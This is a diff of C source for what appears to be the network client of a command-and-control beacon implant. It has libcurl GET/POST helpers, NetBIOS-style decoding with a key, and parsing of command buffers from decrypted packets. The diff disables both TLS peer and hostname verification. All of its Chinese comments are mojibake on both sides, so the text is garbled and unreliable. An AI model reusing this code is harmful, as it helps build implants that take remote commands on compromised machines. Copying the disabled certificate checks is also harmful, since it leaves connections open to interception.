@@ -9,7 +9,7 @@
 //    char* resqresult;
 //}perform_requestresult;
 
-// º¯ÊıÓÃÓÚ´¦ÀíHTTPÏìÓ¦
+// å‡½æ•°ç”¨äºå¤„ç†HTTPå“åº”
 size_t write_callback(void* ptr, size_t size, size_t nmemb, void* userdata) {
     size_t real_size = size * nmemb;
     perform_requestresult* mem = (perform_requestresult*)userdata;
@@ -31,7 +31,7 @@ perform_requestresult perform_post_request(unsigned char* url, struct curl_slist
     CURL* curl;
     CURLcode res;
 
-    // ³õÊ¼»¯CURL¾ä±ú
+    // åˆå§‹åŒ–CURLå¥æŸ„
     curl = curl_easy_init();
     if (!curl) {
         fprintf(stderr, "Failed to initialize curl\n");
@@ -49,23 +49,25 @@ perform_requestresult perform_post_request(unsigned char* url, struct curl_slist
 
 
 
-    // ½«ÇëÇóÍ·Ìí¼Óµ½CURLÇëÇóÖĞ
+    // å°†è¯·æ±‚å¤´æ·»åŠ åˆ°CURLè¯·æ±‚ä¸­
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    // ÉèÖÃÇëÇóURL
+    // è®¾ç½®è¯·æ±‚URL
     curl_easy_setopt(curl, CURLOPT_URL, url);
-    // ÉèÖÃPOSTÇëÇó
+    // è®¾ç½®POSTè¯·æ±‚
     curl_easy_setopt(curl, CURLOPT_POST, 1L);
-    // ÉèÖÃPOSTÊı¾İ
+    // è®¾ç½®POSTæ•°æ®
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData);
-    // ÉèÖÃÏìÓ¦Êı¾İ´¦Àí»Øµ÷º¯Êı
+    // è®¾ç½®å“åº”æ•°æ®å¤„ç†å›è°ƒå‡½æ•°
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-    // ´«µİ received_size ±äÁ¿×÷Îª CURLOPT_WRITEDATA µÄ²ÎÊı
+    // ä¼ é€’ received_size å˜é‡ä½œä¸º CURLOPT_WRITEDATA çš„å‚æ•°
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&chunk);
     //url_easy_setopt(curl, CURLOPT_PROXY, "192.168.203.111:111");
-    // ½ûÓÃ¶ÔÄ¿±ê·şÎñÆ÷Ö¤ÊéµÄÑéÖ¤
+    // ç¦ç”¨å¯¹ç›®æ ‡æœåŠ¡å™¨è¯ä¹¦çš„éªŒè¯
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    // ç¦ç”¨ä¸»æœºåéªŒè¯
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 
-    //²é¿´µ÷ÊÔÏ¸½Ú
+    //æŸ¥çœ‹è°ƒè¯•ç»†èŠ‚
     //curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
 
     while (1) {
@@ -82,12 +84,12 @@ perform_requestresult perform_post_request(unsigned char* url, struct curl_slist
     }
 }
 
-// º¯ÊıÓÃÓÚÖ´ĞĞHTTP GETÇëÇó£¬²¢ÉèÖÃÇëÇóÍ·
+// å‡½æ•°ç”¨äºæ‰§è¡ŒHTTP GETè¯·æ±‚ï¼Œå¹¶è®¾ç½®è¯·æ±‚å¤´
 perform_requestresult perform_get_request(unsigned char* url, struct curl_slist* headers) {
     CURL* curl;
     CURLcode res;
 
-    // ³õÊ¼»¯CURL¾ä±ú
+    // åˆå§‹åŒ–CURLå¥æŸ„
     curl = curl_easy_init();
     if (!curl) {
         fprintf(stderr, "Failed to initialize curl\n");
@@ -101,17 +103,20 @@ perform_requestresult perform_get_request(unsigned char* url, struct curl_slist*
         exit(EXIT_FAILURE);
     }
     chunk.respsize = 0;
-    // ½«ÇëÇóÍ·Ìí¼Óµ½CURLÇëÇóÖĞ
+    // å°†è¯·æ±‚å¤´æ·»åŠ åˆ°CURLè¯·æ±‚ä¸­
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    // ÉèÖÃÇëÇóURL
+    // è®¾ç½®è¯·æ±‚URL
     curl_easy_setopt(curl, CURLOPT_URL, url);
-    // ÉèÖÃÏìÓ¦Êı¾İ´¦Àí»Øµ÷º¯Êı
+    // è®¾ç½®å“åº”æ•°æ®å¤„ç†å›è°ƒå‡½æ•°
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-    // ´«µİ received_size ±äÁ¿×÷Îª CURLOPT_WRITEDATA µÄ²ÎÊı
+    // ä¼ é€’ received_size å˜é‡ä½œä¸º CURLOPT_WRITEDATA çš„å‚æ•°
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&chunk);
-    // Ö´ĞĞHTTP GETÇëÇó
+    // æ‰§è¡ŒHTTP GETè¯·æ±‚
     //curl_easy_setopt(curl, CURLOPT_PROXY, "192.168.203.111:111");
+    // ç¦ç”¨å¯¹ç›®æ ‡æœåŠ¡å™¨è¯ä¹¦çš„éªŒè¯
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    // ç¦ç”¨ä¸»æœºåéªŒè¯
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
     while (1) {
         res = curl_easy_perform(curl);
         if (res != CURLE_OK) {
@@ -162,7 +167,7 @@ unsigned char* parseGetResponse(unsigned char* data, size_t dataSize ,size_t* re
     unsigned char* NetbiosDecodedata = NetbiosDecode((unsigned char*)data, data_length, netbiosKey ,&NetbiosDecodedatalen);
     //printf("NetbiosDecodedata222222222: %d  \n", NetbiosDecodedatalen);
     //for (int i = 0; i < NetbiosDecodedatalen; ++i) {
-    //    printf("%d, ", NetbiosDecodedata[i]); // ÕâÀïÓ¦¸ÃĞŞ¸ÄÎª´òÓ¡½âÂëºóµÄÊı¾İ£¬ÀıÈç data[i] -> NetbiosDecode ºóµÄ½á¹û
+    //    printf("%d, ", NetbiosDecodedata[i]); // è¿™é‡Œåº”è¯¥ä¿®æ”¹ä¸ºæ‰“å°è§£ç åçš„æ•°æ®ï¼Œä¾‹å¦‚ data[i] -> NetbiosDecode åçš„ç»“æœ
     //}
     //printf("\n");
     // Printing the result after NetbiosDecode
@@ -234,8 +239,8 @@ unsigned char* parsePacket(unsigned char* decryptedBuf, uint32_t* totalLen, uint
     for (int i = 0; i < commandLen; i++) {
         printf("%d ", commandBuf[i]);
     }*/
-    // Ä£Äâ´Ó»º³åÇøÖĞ¶ÁÈ¡ Command Length
-    // ¸üĞÂ totalLen
+    // æ¨¡æ‹Ÿä»ç¼“å†²åŒºä¸­è¯»å– Command Length
+    // æ›´æ–° totalLen
     
     *totalLen = *totalLen - (4 + 4 + commandLen);
     *commandBuflen = commandLen;
